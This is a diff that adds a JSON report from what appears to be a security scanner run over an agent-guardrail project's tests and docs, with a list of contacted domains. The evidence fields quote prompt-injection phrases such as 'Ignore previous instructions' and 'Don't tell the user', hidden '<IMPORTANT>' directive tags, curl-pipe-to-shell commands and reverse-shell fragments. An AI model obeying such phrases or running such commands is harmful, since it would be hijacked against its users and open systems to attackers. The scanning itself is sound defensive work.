+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_mcp_guardrail.py",
+      "line": 326,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "47036488db8f78b8a08ff7b4b370f475b5e925c0e8c9ec6f05990f91288a2071"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_mcp_guardrail.py",
+      "line": 15,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "47036488db8f78b8a08ff7b4b370f475b5e925c0e8c9ec6f05990f91288a2071"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_dos_limits.py",
+      "line": 20,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "d24e5de92fbd244cfd0de6ecb41bbeb78e506294a1af2def0cb93f9876985af5"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_rules_detection.py",
+      "line": 14,
+      "evidence": "Ignore all previous prompts",
+      "file_sha256": "2814816c786b48330318accbc5d94f930053bd31079d4a1074ed962129a8ab07"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_rules_detection.py",
+      "line": 84,
+      "evidence": "Don't tell the user",
+      "file_sha256": "2814816c786b48330318accbc5d94f930053bd31079d4a1074ed962129a8ab07"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_rule_packs.py",
+      "line": 182,
+      "evidence": "IGNORE PREVIOUS INSTRUCTIONS",
+      "file_sha256": "09a7a6788a62b2260a11b107378ac9de63b41707360f4cb68f74229944cb31a9"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_provenance.py",
+      "line": 109,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "0630fdfc1b96ff10340bd396fb644d0942bd255825ee031039564e8cbcb9d99e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_scan_surface.py",
+      "line": 45,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "76f4026c11c7bc5009cd4f95be019d3cc0fe070dcdaa53da94e63bd9bfc5f1b1"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_mcp_proxy_trusted_tools.py",
+      "line": 17,
+      "evidence": "Do not tell the user",
+      "file_sha256": "2527bf2734960558e27aa48239b35c5e394563b9e8db3f335a9c9064bebb269c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_mcp_proxy_trusted_tools.py",
+      "line": 17,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "2527bf2734960558e27aa48239b35c5e394563b9e8db3f335a9c9064bebb269c"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_mcp_proxy_schema_quarantine.py",
+      "line": 16,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "e67d8c95629e1e1bb0396fb79ad559fb71706624f2ea3d21440af42fe48de4a3"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_dangerous_rules.py",
+      "line": 46,
+      "evidence": "curl -fsSL https://x.example.com/i.sh | sudo bash",
+      "file_sha256": "7eb5cc7b5f8202920110e5ad51298840a5449528cd0dad621d7d9d47e365ccfd"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_dangerous_rules.py",
+      "line": 44,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "7eb5cc7b5f8202920110e5ad51298840a5449528cd0dad621d7d9d47e365ccfd"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_relative_path_provenance.py",
+      "line": 83,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "9f297f1e2499bd62078b91e84f98d923376766afb8e2602840ce1b5ad9ef9bb2"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_dangerous_guard_files_and_credential_paths.py",
+      "line": 263,
+      "evidence": "curl -s https://x.example.org/i.sh | sh",
+      "file_sha256": "ef98f30f79e606c5e795e3a90d35aa91aab7168b97317b9f930ea6f3ca5565b8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_dangerous_guard_files_and_credential_paths.py",
+      "line": 204,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "ef98f30f79e606c5e795e3a90d35aa91aab7168b97317b9f930ea6f3ca5565b8"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_dangerous_rules_regressions.py",
+      "line": 179,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "3c9284b6a55376018ab6e09e4e77764a4d35f3393902b00e2af92cadc5097f28"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_dangerous_rules_regressions.py",
+      "line": 29,
+      "evidence": "wget -O - https://x.example/i.sh | sh",
+      "file_sha256": "3c9284b6a55376018ab6e09e4e77764a4d35f3393902b00e2af92cadc5097f28"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_dangerous_rules_regressions.py",
+      "line": 66,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "3c9284b6a55376018ab6e09e4e77764a4d35f3393902b00e2af92cadc5097f28"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_hook_after_flagged_result.py",
+      "line": 18,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "3038d694bb5fe80c9e4944ba03d51ce5a540e90b49c681ac55be438a7a3e3dee"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_hook_after_flagged_result.py",
+      "line": 72,
+      "evidence": "curl x | sh",
+      "file_sha256": "3038d694bb5fe80c9e4944ba03d51ce5a540e90b49c681ac55be438a7a3e3dee"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_dangerous_spelling_variants.py",
+      "line": 94,
+      "evidence": "curl -fsSL https://x.example/i.sh \\\\\\n | sh",
+      "file_sha256": "32c5f03da4f37f20108e20e7b3b0dd753334d1f042de9bcc74ff2e52574eec4d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/tests/test_security_agents.py",
+      "line": 61,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "56fe5c378abc4bc1b13811bd6e8cbf85735e5037bf3e7dfe6daa25bbd1e3f72d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/scripts/mcp_walkthrough.py",
+      "line": 93,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "0b001a7a6dc0b6e64e147f568e77fd47a3d6c2a8eba1594fcea58eee7d027b9d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/architecture-and-testing.md",
+      "line": 739,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "9978ddc0c5989c03357488bed603745c39a008776af3012bd2f04ae5789f2c65"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/architecture-and-testing.md",
+      "line": 449,
+      "evidence": "curl \\| sh",
+      "file_sha256": "9978ddc0c5989c03357488bed603745c39a008776af3012bd2f04ae5789f2c65"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/guide.md",
+      "line": 170,
+      "evidence": "curl ... | sh",
+      "file_sha256": "8a6f063f171774bb6539480922617df20d8e13d57b6d76f025bec24f96d10abc"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0104",
+      "summary": "Reverse shell one-liner",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/guide.md",
+      "line": 160,
+      "evidence": "bash -i >& /dev/tcp/",
+      "file_sha256": "8a6f063f171774bb6539480922617df20d8e13d57b6d76f025bec24f96d10abc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/layers.md",
+      "line": 356,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "7109d23eb9c7e84ecb96bdffff1f697c585db9cbd31169b458ca0ad88b7519a2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/layers.md",
+      "line": 106,
+      "evidence": "curl | sh",
+      "file_sha256": "7109d23eb9c7e84ecb96bdffff1f697c585db9cbd31169b458ca0ad88b7519a2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/related-work.md",
+      "line": 149,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "2a755a43fe0638da38abbc24b1387fbeb6f9c6bfacc1db2335c560aa000d3a1f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/benchmarks.md",
+      "line": 215,
+      "evidence": "ignore the previous instructions",
+      "file_sha256": "a9fed9fbfd7d50978b43e36eefd1b96af44b8474e510989251cb3788f8e759ae"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/research-notes/hook-fidelity/hook-fidelity-corpus.md",
+      "line": 610,
+      "evidence": "curl|sh",
+      "file_sha256": "22b29e457b473cc37c70da7e7c4b997119e46594faabb7ac6a8a536a3047bb84"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/research-notes/hook-fidelity/hook-fidelity-study.md",
+      "line": 1133,
+      "evidence": "curl | sh",
+      "file_sha256": "1c258fc51feab258c5fc4fd42e20042bf8ba71ffb5415b56553b69528f7947b9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/security-review.md",
+      "line": 359,
+      "evidence": "Ignore all previous prompts",
+      "file_sha256": "5aabe097f34ddc3732a413bfcc9548752638b5ac9d87ecb68379cb87b4afdddb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/docs/security-review.md",
+      "line": 232,
+      "evidence": "curl ..)`, `printf .. \\| sh",
+      "file_sha256": "5aabe097f34ddc3732a413bfcc9548752638b5ac9d87ecb68379cb87b4afdddb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "IntentShield-c8e1654dc9e1a0213e9f4482aa09331357e883a1/.github/workflows/publish.yml",
+      "line": 69,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "4ad7276120dd9cbf7168ca10a93ea60654fc719a4f99d9570c2df7af1e16a475"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "169.254.169.254, 203.0.113.9, ai-automatedhq.com, aibriefing.dev, attacker.invalid, authzed.com, blog.example.org, collect.attack-l, collect.attack-lab.test, collect.evil-drop.invalid, devabit.com, developer.mozilla.org, docs.partner.example, download.pytorch.org, duckduckgo.com, flask-limiter.readthedocs.io, forms.company.example, hooks.slack.com, invariantlabs.ai, kierangilmurray.substack.com, kinsing.incident.example, labs.cloudsecurityalliance.org, llmgateway.io, malicious-hook.incident.example, mcpservers.org, medium.com, notes.example, nvd.nist.gov, oaidalleapiprodscus.blob.core.windows.net, paper.archive.example, pixel.attacker.invalid, pleeq.com, pubmed.nc, purl.org, pwn-request.incident.example, raw.githubusercontent.com, schemas.openxmlformats.org, shai-hulud.incident.example, snyk.io, staging.acme-internal.dev, status.cloud.example, teamtnt.incident.example, techbytes.app, technologymoment.com, theaitrack.com, thedailyprompt.ai, thehackernews.com, venturebeat.com, widget.acme.dev, www.alation.com, www.amazon.com, www.analyticsinsight.net, www.bing.com, www.docker.com, www.ibm.com, www.jenova.ai, www.linkedin.com, www.metmuseum.org, www.reuters.com, www.tweaktown.com",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "127.0.0.1",
+    "169.254.169.254",
+    "203.0.113.9",
+    "ai-automatedhq.com",
+    "aibriefing.dev",
+    "aimagazine.com",
+    "api.deepseek.com",
+    "api.github.com",
+    "attacker.example",
+    "attacker.invalid",
+    "authzed.com",
+    "blog.example.org",
+    "blog.google",
+    "collect.attack-l",
+    "collect.attack-lab.test",
+    "collect.evil-drop.invalid",
+    "deepwiki.com",
+    "devabit.com",
+    "developer.mozilla.org",
+    "docs.partner.example",
+    "docs.python.org",
+    "download.pytorch.org",
+    "duckduckgo.com",
+    "economictimes.indiatimes.com",
+    "en.wikipedia.org",
+    "example.com",
+    "example.org",
+    "explodingtopics.com",
+    "flask-limiter.readthedocs.io",
+    "forms.company.example",
+    "github.com",
+    "glassofai.com",
+    "hooks.slack.com",
+    "image-generation-server-a8f1.s3.amazonaws.com",
+    "images.unsplash.com",
+    "intuitionlabs.ai",
+    "invariantlabs.ai",
+    "kierangilmurray.substack.com",
+    "kinsing.incident.example",
+    "labs.cloudsecurityalliance.org",
+    "link.springer.com",
+    "llmgateway.io",
+    "malicious-hook.incident.example",
+    "mcp.example.com",
+    "mcpservers.org",
+    "medium.com",
+    "notes.example",
+    "nvd.nist.gov",
+    "oaidalleapiprodscus.blob.core.windows.net",
+    "openai.com",
+    "paper.archive.example",
+    "pixel.attacker.invalid",
+    "pleeq.com",
+    "pubmed.nc",
+    "purl.org",
+    "pwn-request.incident.example",
+    "pypi.org",
+    "raw.githubusercontent.com",
+    "schemas.openxmlformats.org",
+    "shai-hulud.incident.example",
+    "smithery.ai",
+    "snyk.io",
+    "staging.acme-internal.dev",
+    "status.cloud.example",
+    "teamtnt.incident.example",
+    "techbytes.app",
+    "technologymoment.com",
+    "theaitrack.com",
+    "thecondia.com",
+    "thedailyprompt.ai",
+    "thehackernews.com",
+    "ts2.tech",
+    "venturebeat.com",
+    "widget.acme.dev",
+    "www.alation.com",
+    "www.amazon.com",
+    "www.analyticsinsight.net",
+    "www.bing.com",
+    "www.cognitivetoday.com",
+    "www.crescendo.ai",
+    "www.crn.com",
+    "www.deloitte.com",
+    "www.docker.com",
+    "www.geeksforgeeks.org",
+    "www.google.com",
+    "www.ibm.com",
+    "www.jenova.ai",
+    "www.linkedin.com",
+    "www.metmuseum.org",
+    "www.mirantis.com",
+    "www.ptechpartners.com",
+    "www.reuters.com",
+    "www.sanfoundry.com",
+    "www.sciencedaily.com",
+    "www.theverge.com",
+    "www.trendflash.net",
+    "www.tweaktown.com",
+    "www.weforum.org",
+    "www.whats-ai.com",
+    "x.example"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
